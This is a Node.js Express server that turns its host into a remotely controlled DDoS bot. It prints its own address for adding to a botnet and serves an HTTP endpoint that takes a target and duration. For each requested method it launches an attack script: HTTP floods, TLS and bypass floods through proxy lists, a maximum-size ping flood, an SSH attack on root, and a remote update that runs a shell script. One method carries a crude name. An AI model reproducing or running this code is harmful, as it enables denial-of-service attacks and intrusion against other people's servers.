const express = require('express');
const { spawn } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/permen', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  switch (methods) {
    case 'kill':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXKill.js', target, time, '100', '4']);
      break;
    case 'strike':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXStrike.js', 'GET', target, time, '4', '90', 'proxy.txt', '--full']);
      break;
    case 'bypass':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXBypass.js', target, time, '100', '4', 'proxy.txt']);
      break;
    case 'tls':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXTls.js', target, time, '100', '4']);
      break;
    case 'ninja':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXNinja.js', target, time]);
      break;
    case 'mix':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXMix.js', target, time, '100', '4', 'proxy.txt']);
      break;
    case 'raw':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXRaw.js', target, time]);
      break;
    case 'browsers':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXBrowsers.js', target, time, '4', '100']);
      break;
    case 'rape':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXRape.js', 'PermenMD', time, '4', 'proxy.txt', '64', target]);
      break;
    case 'ssh':
      console.log('received');
      spawn('node', ['./lib/cache/StarsXSsh.js', slurp, '22', 'root', time]);
      break;
    case 'proxy':
      console.log('received');
      spawn('node', ['./lib/cache/scrape.js']);
      break;
    case 'update':
      console.log('received');
      spawn('bash', ['./setup.sh']);
      break;
    case 'ping':
      console.log('received');
      spawn('node', ['./lib/cache/kill-ping.js', slurp, '65507', '6', '1', time]);
      break;
    default:
      break;
  }
});

app.listen(port, () => {
  fetchData();
});
